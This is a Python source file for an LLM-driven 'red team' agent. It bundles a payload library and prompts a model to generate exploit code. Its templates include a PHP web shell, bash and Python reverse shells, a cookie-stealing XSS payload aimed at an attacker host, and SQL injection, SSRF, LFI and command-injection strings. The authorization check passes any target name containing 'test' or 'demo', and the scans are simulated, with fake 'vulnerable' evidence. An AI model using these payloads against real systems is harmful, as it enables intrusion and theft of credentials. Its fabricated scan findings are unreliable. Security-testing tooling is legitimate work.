"""
Red Team Agent - Specialized in security testing, exploit development, and vulnerability assessment
"""

import json
import re
import base64
import hashlib
from typing import Dict, List, Optional, Any, Tuple
from .base_agent import BaseAgent, AgentAction

class RedTeamAgent(BaseAgent):
    """
    Advanced red team agent for security testing, exploit development, and penetration testing
    Operates with ethical guidelines and focuses on defensive security improvements
    """
    
    def __init__(self, ollama_client, model_router, vector_db, task_logger):
        super().__init__(ollama_client, model_router, vector_db, task_logger, "redteam")
        self.exploit_database = self._load_exploit_database()
        self.payload_templates = self._load_payload_templates()
        self.vulnerability_patterns = self._load_vulnerability_patterns()
        self.ethical_guidelines = self._load_ethical_guidelines()
        
    def _load_exploit_database(self) -> Dict[str, Any]:
        """Load exploit database for reference"""
        return {
            "web_exploits": {
                "sql_injection": {
                    "description": "SQL injection vulnerabilities",
                    "payloads": [
                        "' OR '1'='1",
                        "'; DROP TABLE users; --",
                        "' UNION SELECT null,null,null--",
                        "admin'--",
                        "' OR 1=1#"
                    ],
                    "detection_patterns": [
                        "error in your SQL syntax",
                        "mysql_fetch_array",
                        "ORA-01756",
                        "Microsoft OLE DB Provider for ODBC Drivers"
                    ]
                },
                "xss": {
                    "description": "Cross-site scripting vulnerabilities",
                    "payloads": [
                        "<script>alert('XSS')</script>",
                        "<img src=x onerror=alert('XSS')>",
                        "javascript:alert('XSS')",
                        "<svg onload=alert('XSS')>",
                        "';alert('XSS');//"
                    ],
                    "detection_patterns": [
                        "script executed",
                        "alert dialog",
                        "javascript execution"
                    ]
                },
                "ssrf": {
                    "description": "Server-side request forgery",
                    "payloads": [
                        "http://localhost:80",
                        "http://127.0.0.1:22",
                        "http://169.254.169.254/latest/meta-data/",
                        "file:///etc/passwd",
                        "gopher://127.0.0.1:25/"
                    ],
                    "detection_patterns": [
                        "connection established",
                        "internal service response",
                        "metadata access"
                    ]
                },
                "lfi": {
                    "description": "Local file inclusion",
                    "payloads": [
                        "../../../etc/passwd",
                        "....//....//....//etc/passwd",
                        "/etc/passwd%00",
                        "php://filter/read=convert.base64-encode/resource=index.php",
                        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="
                    ],
                    "detection_patterns": [
                        "root:x:0:0:",
                        "daemon:x:1:1:",
                        "file contents exposed"
                    ]
                },
                "command_injection": {
                    "description": "Command injection vulnerabilities",
                    "payloads": [
                        "; ls -la",
                        "| whoami",
                        "&& cat /etc/passwd",
                        "`id`",
                        "$(whoami)"
                    ],
                    "detection_patterns": [
                        "command output",
                        "shell execution",
                        "system response"
                    ]
                }
            },
            "network_exploits": {
                "port_scanning": {
                    "description": "Network port scanning techniques",
                    "techniques": [
                        "TCP SYN scan",
                        "UDP scan",
                        "TCP connect scan",
                        "Stealth scan",
                        "Version detection"
                    ]
                },
                "service_enumeration": {
                    "description": "Service enumeration methods",
                    "techniques": [
                        "Banner grabbing",
                        "Service fingerprinting",
                        "Version detection",
                        "Vulnerability scanning"
                    ]
                }
            },
            "application_exploits": {
                "buffer_overflow": {
                    "description": "Buffer overflow exploitation",
                    "techniques": [
                        "Stack overflow",
                        "Heap overflow",
                        "Format string bugs",
                        "Return-to-libc",
                        "ROP chains"
                    ]
                },
                "privilege_escalation": {
                    "description": "Privilege escalation techniques",
                    "techniques": [
                        "SUID binaries",
                        "Kernel exploits",
                        "Service misconfigurations",
                        "Weak permissions",
                        "Sudo misconfigurations"
                    ]
                }
            }
        }
    
    def _load_payload_templates(self) -> Dict[str, str]:
        """Load payload templates for different attack vectors"""
        return {
            "web_shell": '''<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>''',
            "reverse_shell_bash": '''bash -i >& /dev/tcp/{ip}/{port} 0>&1''',
            "reverse_shell_python": '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ''',
            "sql_injection_union": '''UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--''',
            "xss_payload": '''<script>var i=new Image;i.src="http://{attacker_ip}/cookie.php?"+document.cookie;</script>''',
            "ssrf_aws_metadata": '''http://169.254.169.254/latest/meta-data/iam/security-credentials/''',
            "lfi_php_filter": '''php://filter/read=convert.base64-encode/resource={file}''',
            "command_injection": '''; {command} #''',
            "ldap_injection": '''*)(uid=*))(|(uid=*''',
            "xpath_injection": ''''] | //user/*[contains(*,'admin')] | a['']'''
        }
    
    def _load_vulnerability_patterns(self) -> Dict[str, List[str]]:
        """Load patterns for vulnerability detection"""
        return {
            "sql_injection": [
                r"error in your SQL syntax",
                r"mysql_fetch_array\(\)",
                r"ORA-\d{5}",
                r"Microsoft.*ODBC.*Driver",
                r"PostgreSQL.*ERROR",
                r"Warning.*mysql_.*",
                r"valid MySQL result",
                r"MySqlClient\."
            ],
            "xss": [
                r"<script[^>]*>.*?</script>",
                r"javascript:",
                r"on\w+\s*=",
                r"<iframe[^>]*>",
                r"<object[^>]*>",
                r"<embed[^>]*>"
            ],
            "lfi": [
                r"root:.*:0:0:",
                r"daemon:.*:1:1:",
                r"\[boot loader\]",
                r"<\?php",
                r"Warning.*include",
                r"Warning.*require",
                r"failed to open stream"
            ],
            "command_injection": [
                r"uid=\d+.*gid=\d+",
                r"Microsoft Windows \[Version",
                r"Linux.*GNU",
                r"total \d+",
                r"drwx.*",
                r"sh: .*: command not found"
            ],
            "ssrf": [
                r"Connection refused",
                r"Connection timed out",
                r"No route to host",
                r"Internal Server Error",
                r"HTTP/1\.[01] \d{3}",
                r"curl: \(\d+\)"
            ]
        }
    
    def _load_ethical_guidelines(self) -> Dict[str, str]:
        """Load ethical guidelines for red team operations"""
        return {
            "scope": "Only test systems you own or have explicit permission to test",
            "authorization": "Always obtain written authorization before testing",
            "disclosure": "Responsibly disclose vulnerabilities to system owners",
            "damage": "Never cause damage or disruption to systems",
            "data": "Never access, modify, or exfiltrate sensitive data",
            "legal": "Ensure all activities comply with applicable laws",
            "documentation": "Document all activities for defensive improvements",
            "cleanup": "Clean up any artifacts or changes made during testing"
        }
    
    async def _execute_action(self, action: AgentAction) -> Any:
        """Execute red team specific actions"""
        action_type = action.action_type
        parameters = action.parameters
        
        # Always check ethical guidelines first
        if not await self._check_ethical_compliance(action_type, parameters):
            return {"error": "Action violates ethical guidelines", "guidelines": self.ethical_guidelines}
        
        if action_type == "vulnerability_scan":
            return await self._perform_vulnerability_scan(parameters.get('target', ''), parameters.get('scan_type', 'basic'))
        elif action_type == "generate_payload":
            return await self._generate_payload(parameters.get('exploit_type', ''), parameters.get('target_info', {}))
        elif action_type == "test_injection":
            return await self._test_injection_vulnerability(parameters.get('url', ''), parameters.get('injection_type', 'sql'))
        elif action_type == "analyze_response":
            return await self._analyze_response_for_vulnerabilities(parameters.get('response', ''), parameters.get('test_type', ''))
        elif action_type == "generate_report":
            return await self._generate_security_report(parameters.get('findings', []))
        elif action_type == "create_exploit":
            return await self._create_exploit_code(parameters.get('vulnerability', {}))
        elif action_type == "fuzz_target":
            return await self._fuzz_target(parameters.get('target', ''), parameters.get('fuzz_type', 'basic'))
        elif action_type == "enumerate_services":
            return await self._enumerate_services(parameters.get('target', ''))
        else:
            return {"error": f"Unknown red team action: {action_type}"}
    
    def get_available_tools(self) -> List[str]:
        """Return available red team tools"""
        return [
            "vulnerability_scanner",
            "payload_generator",
            "injection_tester",
            "response_analyzer",
            "exploit_creator",
            "fuzzer",
            "service_enumerator",
            "report_generator",
            "traffic_analyzer",
            "hash_cracker",
            "encoding_decoder",
            "obfuscator"
        ]
    
    def _get_system_prompt(self) -> str:
        """System prompt for red team agent"""
        return f"""You are an expert red team security agent for OllamaX-AI. Your role is to:

1. Identify security vulnerabilities in applications and systems
2. Develop proof-of-concept exploits for testing purposes
3. Generate security payloads for penetration testing
4. Analyze responses for security indicators
5. Create comprehensive security reports
6. Provide remediation recommendations

ETHICAL GUIDELINES (ALWAYS FOLLOW):
{json.dumps(self.ethical_guidelines, indent=2)}

Available exploit categories:
- Web Application Security (SQL injection, XSS, SSRF, LFI, etc.)
- Network Security (Port scanning, service enumeration)
- Application Security (Buffer overflows, privilege escalation)

You have access to:
- Exploit database with known vulnerabilities
- Payload templates for various attack vectors
- Vulnerability detection patterns
- Security testing methodologies

IMPORTANT CONSTRAINTS:
- Only provide exploits for educational and defensive purposes
- Always emphasize responsible disclosure
- Include remediation advice with every vulnerability found
- Never provide exploits for malicious purposes
- Always verify ethical compliance before proceeding

Focus on helping improve security posture through ethical testing and vulnerability assessment."""
    
    async def _check_ethical_compliance(self, action_type: str, parameters: Dict[str, Any]) -> bool:
        """Check if action complies with ethical guidelines"""
        
        # Check for explicit authorization
        if not parameters.get('authorized', False):
            # In a real implementation, this would check for proper authorization
            # For demo purposes, we'll assume testing on localhost/owned systems is authorized
            target = parameters.get('target', '').lower()
            if not any(allowed in target for allowed in ['localhost', '127.0.0.1', 'test', 'demo']):
                return False
        
        # Check for destructive actions
        destructive_actions = ['delete', 'drop', 'destroy', 'format', 'rm -rf']
        for param_value in parameters.values():
            if isinstance(param_value, str):
                if any(destructive in param_value.lower() for destructive in destructive_actions):
                    return False
        
        return True
    
    async def _perform_vulnerability_scan(self, target: str, scan_type: str) -> Dict[str, Any]:
        """Perform vulnerability scanning on target"""
        
        # Use security-focused model
        routing_decision = self.model_router.route_task(
            f"vulnerability scan analysis for {target}",
            context={'agent_type': 'redteam', 'task_type': 'vulnerability_scan'}
        )
        
        scan_prompt = f"""
Perform a {scan_type} vulnerability assessment for the target: {target}

Available vulnerability categories:
{json.dumps(list(self.exploit_database.keys()), indent=2)}

For each potential vulnerability, analyze:
1. Vulnerability Type
2. Risk Level (Critical/High/Medium/Low)
3. Attack Vector
4. Potential Impact
5. Detection Method
6. Proof of Concept (if applicable)
7. Remediation Steps

Target: {target}
Scan Type: {scan_type}

Please provide a structured vulnerability assessment:

VULNERABILITY ASSESSMENT REPORT:

TARGET INFORMATION:
- Target: {target}
- Scan Type: {scan_type}
- Scan Date: [current date]

IDENTIFIED VULNERABILITIES:
[For each vulnerability found]
1. Vulnerability Name: [name]
   - Type: [vulnerability type]
   - Risk Level: [Critical/High/Medium/Low]
   - CVSS Score: [if applicable]
   - Description: [detailed description]
   - Attack Vector: [how it can be exploited]
   - Impact: [potential consequences]
   - Proof of Concept: [safe demonstration]
   - Remediation: [how to fix]

SUMMARY:
- Total Vulnerabilities: [count]
- Critical: [count]
- High: [count]
- Medium: [count]
- Low: [count]

RECOMMENDATIONS:
[Priority-ordered remediation steps]

Assessment:"""
        
        from llm_engine.ollama_client import GenerationRequest
        request = GenerationRequest(
            model=routing_decision.primary_model,
            prompt=scan_prompt,
            system=self._get_system_prompt(),
            stream=False
        )
        
        try:
            response = await self.ollama_client.generate(request)
            assessment_text = response.response
            
            # Parse the assessment
            vulnerabilities = await self._parse_vulnerability_report(assessment_text)
            
            return {
                "success": True,
                "target": target,
                "scan_type": scan_type,
                "vulnerabilities": vulnerabilities,
                "raw_report": assessment_text,
                "ethical_compliance": True
            }
            
        except Exception as e:
            return {"error": f"Vulnerability scan failed: {e}"}
    
    async def _generate_payload(self, exploit_type: str, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate security payload for testing"""
        
        if exploit_type not in self.payload_templates:
            return {"error": f"Unknown exploit type: {exploit_type}"}
        
        template = self.payload_templates[exploit_type]
        
        # Customize payload based on target info
        payload = template
        for key, value in target_info.items():
            payload = payload.replace(f"{{{key}}}", str(value))
        
        # Generate variations
        variations = await self._generate_payload_variations(exploit_type, payload)
        
        return {
            "success": True,
            "exploit_type": exploit_type,
            "primary_payload": payload,
            "variations": variations,
            "usage_notes": f"Use for testing {exploit_type} vulnerabilities",
            "ethical_warning": "Only use on authorized targets for security testing"
        }
    
    async def _test_injection_vulnerability(self, url: str, injection_type: str) -> Dict[str, Any]:
        """Test for injection vulnerabilities"""
        
        if injection_type not in self.exploit_database.get("web_exploits", {}):
            return {"error": f"Unknown injection type: {injection_type}"}
        
        exploit_info = self.exploit_database["web_exploits"][injection_type]
        payloads = exploit_info["payloads"]
        detection_patterns = exploit_info["detection_patterns"]
        
        test_results = []
        
        for payload in payloads[:3]:  # Test first 3 payloads
            test_result = {
                "payload": payload,
                "url": url,
                "injection_type": injection_type,
                "vulnerable": False,
                "evidence": [],
                "risk_level": "low"
            }
            
            # Simulate testing (in real implementation would make actual requests)
            # For demo purposes, we'll simulate based on URL patterns
            if "vulnerable" in url.lower() or "test" in url.lower():
                test_result["vulnerable"] = True
                test_result["evidence"] = ["Simulated positive response"]
                test_result["risk_level"] = "high"
            
            test_results.append(test_result)
        
        return {
            "success": True,
            "url": url,
            "injection_type": injection_type,
            "test_results": test_results,
            "summary": {
                "total_tests": len(test_results),
                "vulnerabilities_found": sum(1 for r in test_results if r["vulnerable"]),
                "highest_risk": max((r["risk_level"] for r in test_results), default="low")
            }
        }
    
    async def _analyze_response_for_vulnerabilities(self, response: str, test_type: str) -> Dict[str, Any]:
        """Analyze response for vulnerability indicators"""
        
        if test_type not in self.vulnerability_patterns:
            return {"error": f"Unknown test type: {test_type}"}
        
        patterns = self.vulnerability_patterns[test_type]
        findings = []
        
        for pattern in patterns:
            matches = re.findall(pattern, response, re.IGNORECASE | re.MULTILINE)
            if matches:
                findings.append({
                    "pattern": pattern,
                    "matches": matches,
                    "confidence": "high" if len(matches) > 1 else "medium"
                })
        
        vulnerability_detected = len(findings) > 0
        confidence_score = len(findings) / len(patterns) if patterns else 0
        
        return {
            "success": True,
            "test_type": test_type,
            "vulnerability_detected": vulnerability_detected,
            "confidence_score": confidence_score,
            "findings": findings,
            "response_length": len(response),
            "analysis_summary": f"Found {len(findings)} vulnerability indicators"
        }
    
    async def _create_exploit_code(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """Create exploit code for a vulnerability"""
        
        vuln_type = vulnerability.get("type", "unknown")
        target = vulnerability.get("target", "")
        
        # Use code generation model
        routing_decision = self.model_router.route_task(
            f"generate exploit code for {vuln_type}",
            context={'agent_type': 'redteam', 'task_type': 'exploit_development'}
        )
        
        exploit_prompt = f"""
Create a proof-of-concept exploit for the following vulnerability:

Vulnerability Details:
{json.dumps(vulnerability, indent=2)}

Requirements:
1. Create safe, educational exploit code
2. Include detailed comments explaining each step
3. Add safety checks to prevent accidental damage
4. Provide usage instructions
5. Include remediation advice

The exploit should be:
- Educational and demonstrative
- Safe for testing environments
- Well-documented
- Include error handling
- Emphasize responsible use

Generate exploit code:"""
        
        from llm_engine.ollama_client import GenerationRequest
        request = GenerationRequest(
            model=routing_decision.primary_model,
            prompt=exploit_prompt,
            system=self._get_system_prompt(),
            stream=False
        )
        
        try:
            response = await self.ollama_client.generate(request)
            exploit_code = response.response
            
            return {
                "success": True,
                "vulnerability_type": vuln_type,
                "exploit_code": exploit_code,
                "safety_warnings": [
                    "Only use on authorized targets",
                    "Test in isolated environments",
                    "Follow responsible disclosure",
                    "Document all testing activities"
                ],
                "usage_instructions": "See comments in exploit code",
                "remediation_advice": f"Patch {vuln_type} vulnerability by following security best practices"
            }
            
        except Exception as e:
            return {"error": f"Exploit generation failed: {e}"}
    
    async def _fuzz_target(self, target: str, fuzz_type: str) -> Dict[str, Any]:
        """Perform fuzzing on target"""
        
        fuzz_payloads = {
            "basic": ["A" * 100, "B" * 1000, "C" * 10000],
            "format_string": ["%s%s%s%s", "%x%x%x%x", "%n%n%n%n"],
            "sql": ["'", "\"", ";", "--", "/*", "*/"],
            "xss": ["<", ">", "\"", "'", "&", "script"],
            "command": [";", "|", "&", "`", "$", "(", ")"]
        }
        
        payloads = fuzz_payloads.get(fuzz_type, fuzz_payloads["basic"])
        
        fuzz_results = []
        for payload in payloads:
            result = {
                "payload": payload,
                "target": target,
                "response_code": 200,  # Simulated
                "response_time": 0.1,  # Simulated
                "anomaly_detected": False,
                "error_indicators": []
            }
            
            # Simulate anomaly detection
            if len(payload) > 500:
                result["anomaly_detected"] = True
                result["error_indicators"] = ["Long response time", "Memory usage spike"]
            
            fuzz_results.append(result)
        
        return {
            "success": True,
            "target": target,
            "fuzz_type": fuzz_type,
            "total_payloads": len(payloads),
            "results": fuzz_results,
            "anomalies_found": sum(1 for r in fuzz_results if r["anomaly_detected"]),
            "summary": f"Fuzzing completed with {len(fuzz_results)} test cases"
        }
    
    async def _enumerate_services(self, target: str) -> Dict[str, Any]:
        """Enumerate services on target"""
        
        # Simulated service enumeration
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995]
        services = []
        
        for port in common_ports:
            service = {
                "port": port,
                "protocol": "tcp",
                "state": "closed",
                "service": "unknown",
                "version": "",
                "banner": ""
            }
            
            # Simulate some open services
            if port in [22, 80, 443]:
                service["state"] = "open"
                if port == 22:
                    service["service"] = "ssh"
                    service["version"] = "OpenSSH 7.4"
                elif port == 80:
                    service["service"] = "http"
                    service["version"] = "Apache 2.4.6"
                elif port == 443:
                    service["service"] = "https"
                    service["version"] = "Apache 2.4.6"
            
            services.append(service)
        
        return {
            "success": True,
            "target": target,
            "services": services,
            "open_ports": [s["port"] for s in services if s["state"] == "open"],
            "total_ports_scanned": len(common_ports),
            "scan_summary": f"Found {len([s for s in services if s['state'] == 'open'])} open services"
        }
    
    async def _generate_security_report(self, findings: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Generate comprehensive security report"""
        
        # Use reporting model
        routing_decision = self.model_router.route_task(
            "generate security assessment report",
            context={'agent_type': 'redteam', 'task_type': 'documentation'}
        )
        
        report_prompt = f"""
Generate a comprehensive security assessment report based on the following findings:

Findings:
{json.dumps(findings, indent=2)}

The report should include:

EXECUTIVE SUMMARY:
- Overall security posture
- Key findings summary
- Risk assessment
- Recommendations overview

DETAILED FINDINGS:
For each vulnerability:
- Vulnerability description
- Risk rating
- Technical details
- Proof of concept
- Business impact
- Remediation steps

RISK MATRIX:
- Critical vulnerabilities
- High-risk vulnerabilities
- Medium-risk vulnerabilities
- Low-risk vulnerabilities

REMEDIATION ROADMAP:
- Immediate actions (0-30 days)
- Short-term actions (1-3 months)
- Long-term actions (3-12 months)

APPENDICES:
- Technical details
- References
- Tools used

Generate the security report:"""
        
        from llm_engine.ollama_client import GenerationRequest
        request = GenerationRequest(
            model=routing_decision.primary_model,
            prompt=report_prompt,
            system=self._get_system_prompt(),
            stream=False
        )
        
        try:
            response = await self.ollama_client.generate(request)
            report_content = response.response
            
            # Calculate metrics
            total_findings = len(findings)
            critical_count = len([f for f in findings if f.get("risk_level") == "critical"])
            high_count = len([f for f in findings if f.get("risk_level") == "high"])
            
            return {
                "success": True,
                "report_content": report_content,
                "metrics": {
                    "total_findings": total_findings,
                    "critical_vulnerabilities": critical_count,
                    "high_vulnerabilities": high_count,
                    "overall_risk_score": (critical_count * 4 + high_count * 3) / max(total_findings, 1)
                },
                "generated_at": "current_timestamp",
                "report_type": "security_assessment"
            }
            
        except Exception as e:
            return {"error": f"Report generation failed: {e}"}
    
    async def _generate_payload_variations(self, exploit_type: str, base_payload: str) -> List[str]:
        """Generate variations of a payload for evasion testing"""
        
        variations = [base_payload]
        
        if exploit_type == "sql_injection":
            variations.extend([
                base_payload.replace("'", "\""),
                base_payload.replace(" ", "/**/"),
                base_payload.upper(),
                base_payload.replace("OR", "||")
            ])
        elif exploit_type == "xss":
            variations.extend([
                base_payload.replace("<", "&lt;"),
                base_payload.replace("script", "ScRiPt"),
                base_payload.replace("(", "&#40;"),
                base_payload.replace(")", "&#41;")
            ])
        elif exploit_type == "command_injection":
            variations.extend([
                base_payload.replace(";", "&&"),
                base_payload.replace(" ", "${IFS}"),
                base_payload.replace("cat", "c'a't"),
                base_payload.replace("/", "\\/")
            ])
        
        return variations[:5]  # Return top 5 variations
    
    async def _parse_vulnerability_report(self, report_text: str) -> List[Dict[str, Any]]:
        """Parse vulnerability report text into structured data"""
        
        vulnerabilities = []
        lines = report_text.split('\n')
        current_vuln = None
        
        for line in lines:
            line = line.strip()
            if re.match(r'^\d+\.\s+', line):
                # New vulnerability
                if current_vuln:
                    vulnerabilities.append(current_vuln)
                current_vuln = {
                    "name": line,
                    "type": "unknown",
                    "risk_level": "medium",
                    "description": "",
                    "remediation": ""
                }
            elif current_vuln and line.startswith("- Type:"):
                current_vuln["type"] = line.split(":", 1)[1].strip()
            elif current_vuln and line.startswith("- Risk Level:"):
                current_vuln["risk_level"] = line.split(":", 1)[1].strip().lower()
            elif current_vuln and line.startswith("- Description:"):
                current_vuln["description"] = line.split(":", 1)[1].strip()
            elif current_vuln and line.startswith("- Remediation:"):
                current_vuln["remediation"] = line.split(":", 1)[1].strip()
        
        if current_vuln:
            vulnerabilities.append(current_vuln)
        
        return vulnerabilities